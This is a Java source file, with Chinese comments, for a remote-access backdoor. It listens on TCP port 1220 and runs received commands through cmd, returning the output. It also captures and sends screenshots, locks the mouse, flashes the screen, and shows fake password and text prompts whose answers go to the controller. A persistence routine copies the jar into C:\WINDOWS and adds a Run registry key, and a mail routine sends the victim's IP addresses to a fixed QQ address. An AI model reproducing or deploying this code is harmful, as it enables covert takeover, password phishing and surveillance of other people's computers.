import java.awt.AWTException;
import java.awt.Color;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.MouseInfo;
import java.awt.Point;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Enumeration;
import java.util.Properties;

import javax.imageio.ImageIO;
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;

public class Test {
	ServerSocket serverSocket;
	Socket socket;
	DataInputStream dis;
	DataOutputStream dos;
	String commendString;
	Process process;
	Runtime r = Runtime.getRuntime();
	BufferedReader bufferedReader;
	BufferedImage bi;
	Robot robot;
	SMail smail;
	MyCopy myCopy;
	MouseLockThread mouseLockThread;
	int time[] = { 5000, 120000, 300000 }, timeSel = 0;

	public Test() {
		/*
		  在注册表中设置开机自动运行 register();
		  以及发送邮件，主要是把自己的IP发出来
		 register();
		 smail = new SMail();
		 while (!smail.sended) {
		 if (timeSel >= 3) {
		 timeSel = 2;
		 }
		 try {
		 Thread.sleep(time[timeSel++]);
		 } catch (InterruptedException e) {
		 e.printStackTrace();
		 }
		 smail.send(getIP());
		 }*/
		try {
			serverSocket = new ServerSocket(1220);
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		while (true) {
			try {
				socket = serverSocket.accept();
				dis = new DataInputStream(socket.getInputStream());
				dos = new DataOutputStream(socket.getOutputStream());
			} catch (IOException e) {
				try {
					dis.close();
					dos.close();
				} catch (IOException e1) {
					e1.printStackTrace();
				}
				e.printStackTrace();
			}
			try {
				//robot可以执行不少操作，如处理鼠标键盘
				robot = new Robot();
			} catch (AWTException e) {
				e.printStackTrace();
			}
			go();
		}
	}
	/* 在注册表中设置开机自动运行 */
	void go() {
		while (true) {
			/*
			    * 这里不断的接受发送过来的命令然后根据命令执行相应的操作
			    * 如：（标有√，的是本程序已经实现的功能）
			    * 1、我们可以通过开启一个线程通过robot锁定鼠标（√）
			    * 2、执行dos命令（√）
			    * 3、传输被控制端的文件
			    * 4、查看被控制端的桌面（√）
			    * 5、在被控制端弹出对话框（√）
			    * 6、让被控制端闪屏（√）
			    * 7、等等等等
			    * 具体的实现都在这里进行，当然这个需要和控制者那段的代码相配合
			    * 同时自己设计好具体的命令
			    * */
			try {
				commendString = dis.readUTF().trim();
			} catch (IOException e) {
				System.out.println("leave");
				break;
			}
			if (commendString.startsWith("-d")) {// 显示一个对话框
				commendString = commendString.substring(2);
				if (commendString.startsWith("outmsg")) {// 输出信息对话框
					try {
						commendString = commendString.substring(7);
					} catch (Exception ee) {
						continue;
					}
					showDialog(commendString);
				} else if (commendString.startsWith("inmsg")) {// 弹出一个输入对话框
																// 输入普通文字
					try {
						commendString = commendString.substring(6);
					} catch (Exception ee) {
						continue;
					}
					//showDialog(commendString);
					showDialogMsgInput(commendString);
				} else if (commendString.startsWith("inpass")) {// 弹出一个输入对话框
																// 输入密码
					try {
						commendString = commendString.substring(7);
					} catch (Exception ee) {
						continue;
					}
					showDialogPassInput(commendString);
				} 
			} else if (commendString.startsWith("-p")) {//截图
				sendPic();
			} else if (commendString.startsWith("-m")) {//锁定鼠标
				try {
					commendString = commendString.substring(3);
				} catch (Exception ee) {
					continue;
				}
				mouseLock(commendString);
			}else if(commendString.startsWith("-flash")){
				try{
					commendString = commendString.substring(7);
				}catch(Exception e){
					commendString="";
				}
				new Flash(commendString);
			}
			else {
				dosExe(commendString);
			}
		}
	}
	/*在注册表注册开机自动启动*/
	public void register() {
		JarUtil jarUtil = new JarUtil(Test.class);
		String path = jarUtil.getJarPath();
		if (!path.equalsIgnoreCase("C:\\WINDOWS")) {
			System.out.println("run");
			new OtherApp().start();
			myCopy = new MyCopy();
			path += "\\" + jarUtil.getJarName();
			myCopy.fileCopy(path, "C:\\WINDOWS\\jx.jar");
			String key = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run";
			String name = "jx";
			String value = "C:\\WINDOWS\\jx.jar";
			String command = "reg add " + key + " /v " + name + " /d " + value;
			try {
				Runtime.getRuntime().exec(command);
			} catch (IOException e) {
				e.printStackTrace();
			}

		}
	}
	/*显示密码对话框*/
	void showDialogPassInput(String s) {
		MyDialogPassInput input = new MyDialogPassInput(s);
		s = input.pass;
		try {
			dos.writeUTF("password:"+s);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	/*输了信息对话框*/
	void showDialogMsgInput(String s) {
		MyDialogMsgInput input = new MyDialogMsgInput(s);
		s = input.string;
		try {
			dos.writeUTF("msg:"+s);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	/*启动线程锁定鼠标*/
	void mouseLock(String s) {
		if (s.equals("l")) {
			if (mouseLockThread == null || mouseLockThread.isAlive() == false) {
				mouseLockThread = new MouseLockThread();
				mouseLockThread.flag = true;
				mouseLockThread.start();
			}
		} else if (s.equals("a")) {
			mouseLockThread.flag = false;
		}
	}
	/*执行dos命令*/
	void dosExe(String dosString) {
		String command = "cmd /c " + dosString;
		String s = null;
		try {
			process = r.exec(command);
			bufferedReader = new BufferedReader(new InputStreamReader(process
					.getInputStream()));
			dos.writeUTF("1start");
			while ((s = bufferedReader.readLine()) != null) {
				s = s.trim();
				dos.writeUTF(s);
			}
			dos.writeUTF("1end");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	/*发送图片*/
	void sendPic() {
		BufferedImage bi = robot.createScreenCapture(new Rectangle(0, 0,
				Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit
						.getDefaultToolkit().getScreenSize().height));
		byte[] imageData = getCompressedImage(bi);
		if (imageData != null) {
			try {
				dos.writeUTF("2start");
				dos.writeInt(imageData.length);
				dos.write(imageData);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}

	void showDialog(String s) {
		new ShowDialogThread(s).start();
	}

	public static void main(String[] args) {
		new Test();
	}
	/*处理图片，方便传输*/
	public byte[] getCompressedImage(BufferedImage image) {
		byte[] imageData = null;
		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			ImageIO.write(image, "jpg", baos);
			imageData = baos.toByteArray();
		} catch (IOException ex) {
			imageData = null;
		}
		return imageData;
	}
	/*获取本地IP*/
	String getIP() {
		String ipString = "";
		Enumeration<NetworkInterface> netInterfaces = null;
		try {
			netInterfaces = NetworkInterface.getNetworkInterfaces();
			while (netInterfaces.hasMoreElements()) {
				NetworkInterface ni = netInterfaces.nextElement();
				ipString = ipString + ni.getDisplayName() + "\n";
				ipString = ipString + ni.getName() + "\n";
				Enumeration<InetAddress> ips = ni.getInetAddresses();
				while (ips.hasMoreElements()) {
					ipString = ipString + ips.nextElement().getHostAddress()
							+ "\n";
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return ipString;
	}
	/*显示消息对话框*/
	class ShowDialogThread extends Thread {
		String info;

		public ShowDialogThread(String s) {
			this.info = s;
		}

		public void run() {
			JOptionPane.showMessageDialog(null, info);
		}
	}

	class MouseLockThread extends Thread {
		boolean flag = false;

		public void run() {
			Point p = MouseInfo.getPointerInfo().getLocation();
			while (flag) {
				try {
					Thread.sleep(1);
					robot.mouseMove(p.x, p.y);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}
	}

	// 这里可以启动其它的应用程序
	class OtherApp extends Thread {
		public void run() {	
			//new other();
		}
	}

	class JarUtil {
		private String jarName;
		private String jarPath;

		public JarUtil(Class clazz) {
			String path = clazz.getProtectionDomain().getCodeSource()
					.getLocation().getFile();
			try {
				path = java.net.URLDecoder.decode(path, "UTF-8");
			} catch (java.io.UnsupportedEncodingException e) {
				e.printStackTrace();
			}

			java.io.File jarFile = new java.io.File(path);
			this.jarName = jarFile.getName();

			java.io.File parent = jarFile.getParentFile();
			if (parent != null) {
				this.jarPath = parent.getAbsolutePath();
			}
		}

		public String getJarName() {
			try {
				return java.net.URLDecoder.decode(this.jarName, "UTF-8");
			} catch (java.io.UnsupportedEncodingException ex) {
			}
			return null;
		}

		public String getJarPath() {
			try {
				return java.net.URLDecoder.decode(this.jarPath, "UTF-8");
			} catch (java.io.UnsupportedEncodingException e) {
				e.printStackTrace();
			}
			return null;
		}
	}
	/*该类用于文件复制*/
	class MyCopy {
		public int fileCopy(String sFile, String oFile) {
			File file = new File(sFile);
			if (!file.exists()) {
				System.out.println(sFile + " not have");
				return -1;
			}
			File fileb = new File(oFile);
			FileInputStream fis = null;
			FileOutputStream fos = null;
			try {
				fis = new FileInputStream(file);
				fos = new FileOutputStream(fileb);
				byte[] bb = new byte[(int) file.length()];
				fis.read(bb);
				fos.write(bb);
			} catch (IOException e) {
				e.printStackTrace();
				return -2;
			} finally {
				try {
					fis.close();
					fos.close();
				} catch (IOException e) {
					e.printStackTrace();
					return -2;
				}
			}
			return 0;
		}
	}
	/*
	 * 发送邮件部分 需要一两个邮箱，一个是发送方邮箱，一个是接受邮箱
	 */
	class SMail {
		boolean sended = false;
		Properties props;
		Session session;
		Message msg;
		Transport transport;

		public void send(String s) {
			try {
				// System.out.println(s);
				props = new Properties();
				props.setProperty("mail.smtp.auth", "true");
				props.setProperty("mail.transport.protocol", "smtp");
				session = Session.getDefaultInstance(props);
				// session.setDebug(true);
				msg = new MimeMessage(session);
				msg.setSubject("ip");
				msg.setText(s);
				/*xxxxxxxxxxxxxxxx为发送方邮箱用户名*/
				msg.setFrom(new InternetAddress("xxxxxxxxxxxxxxxx@sina.com"));
				transport = session.getTransport();
				/*xxxxxxxxxxxxxxxx为发送方邮箱用户名、
				 *yyyyyyyyy为发送方邮箱密码*/
				transport.connect("smtp.sina.com", 25, "xxxxxxxxxxxxxxxx", "yyyyyyyyy");
				transport.sendMessage(msg, new Address[] { new InternetAddress(
						"496977458@qq.com") });
				transport.close();
				sended = true;
			} catch (Exception e) {
			}

		}

		public SMail() {
			sended = false;
		}
	}
	/*密码输入框*/
	class MyDialogPassInput extends JDialog {
		JPasswordField text;
		JButton sureButton;
		String pass;

		public MyDialogPassInput(String s) {
			this.setModal(true);
			this.setResizable(false);
			FlowLayout fl = new FlowLayout();
			fl.setAlignment(FlowLayout.CENTER);
			this.setLayout(fl);
			text = new JPasswordField(10);
			text.setEchoChar('*');
			add(new JLabel(s + ":"));
			add(text);
			sureButton = new JButton("确定");
			sureButton.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					if (new String(text.getPassword()).trim().equals("")) {
						return;
					}
					pass = new String(text.getPassword());
					MyDialogPassInput.this.dispose();
				}
			});
			this.add(sureButton);
			int width = Toolkit.getDefaultToolkit().getScreenSize().width;
			int height = Toolkit.getDefaultToolkit().getScreenSize().height;
			int x = 200, y = 80;
			setBounds((width - x) / 2, (height - y) / 2, x, y);
			setUndecorated(true);
			validate();
			this.setVisible(true);
		}
	}
	/*闪屏*/
	class Flash {
		JFrame frame;
		JPanel pane;
		Color c[] = {  Color.pink,Color.white,Color.blue};
		int i;
		Image offScreenImage = null;	
		String msg;
		public Flash(String s) {
			msg=s;
			final int width=Toolkit.getDefaultToolkit().getScreenSize().width;
			final int height=Toolkit.getDefaultToolkit().getScreenSize().height;
			frame = new JFrame();
			frame.setAlwaysOnTop(true);
			frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
			frame.setUndecorated(true);
			frame.setBounds(0,0,width,height);
			pane = new JPanel() {
				public void paint(Graphics g) {
					if(offScreenImage == null){
						offScreenImage=this.createImage(width, height);
					}
					Graphics gg=offScreenImage.getGraphics();
					gg.setFont(new Font(null, Font.PLAIN, 50));
					gg.setColor(c[i]);
					gg.fillRect(0, 0, width, height);
					gg.setColor(Color.black);
					gg.drawString(msg, 200, 50);
					g.drawImage(offScreenImage, 0, 0, null);
				}
			};
			frame.setContentPane(pane);
			frame.setVisible(true);
			new Thread() {
				public void run() {
					int time=0;
					while (i < c.length) {
						Flash.this.myUpdate();
						try {
							Thread.sleep(50);
							time++;
							if(time==100){
								frame.dispose();
								break;
							}
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
				}
			}.start();
		}
		public void myUpdate() {
			if (i == c.length-1) {
				i = 0;
			} else {
				i++;
			}
			pane.repaint();
		}
	}
	/*输入对话框*/
	class MyDialogMsgInput extends JDialog {
		JTextField text;
		JButton sureButton;
		String string;

		public MyDialogMsgInput(String s) {
			this.setModal(true);
			this.setResizable(false);
			FlowLayout fl = new FlowLayout();
			fl.setAlignment(FlowLayout.CENTER);
			this.setLayout(fl);
			text = new JTextField(10);
			add(new JLabel(s + ":"));
			add(text);
			sureButton = new JButton("确定");
			sureButton.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					if (new String(text.getText()).trim().equals("")) {
						return;
					}
					string = new String(text.getText());
					MyDialogMsgInput.this.dispose();
				}
			});
			this.add(sureButton);
			int width = Toolkit.getDefaultToolkit().getScreenSize().width;
			int height = Toolkit.getDefaultToolkit().getScreenSize().height;
			int x = 200, y = 80;
			setBounds((width - x) / 2, (height - y) / 2, x, y);
			setUndecorated(true);
			validate();
			this.setVisible(true);
		}
	}
}
